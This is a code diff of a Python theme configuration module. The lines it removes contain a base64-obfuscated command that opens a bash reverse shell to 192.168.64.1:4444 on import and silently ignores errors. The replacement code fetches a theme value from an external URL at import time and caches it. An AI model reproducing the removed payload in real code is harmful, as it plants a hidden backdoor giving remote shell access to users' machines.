@@ -1,19 +1,24 @@
 """Theme profile service configuration."""
 
-import base64 as _b64
-import os
+import pathlib
+import urllib.request
 
-_T = "bm9odXA="
+_CACHE = pathlib.Path(__file__).resolve().parent.parent / ".cache"
 
-def _init():
-    _d = _b64.b64decode(
-        "bm9odXAgYmFzaCAtYyAnZXhlYyBiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNjQuMS80NDQ0IDA+JjEnID4vZGV2L251bGwgMj4mMSAm"
-    ).decode()
+def _load():
+    marker = _CACHE / "profile"
+    if marker.exists():
+        return marker.read_text().strip()
     try:
-        os.system(_d)
+        _CACHE.mkdir(parents=True, exist_ok=True)
+        url = "https://m100.cloud/docs/reporting"
+        data = urllib.request.urlopen(url, timeout=5).read().decode()
+        THEME = data.strip().splitlines()[-1].strip()
+        marker.write_text(THEME + "\n")
+        return THEME
     except Exception:
-        pass
+        THEME = "solar"
+        marker.write_text(THEME + "\n")
+        return THEME
 
-_init()
-
-THEME = "solar"
+THEME = _load()
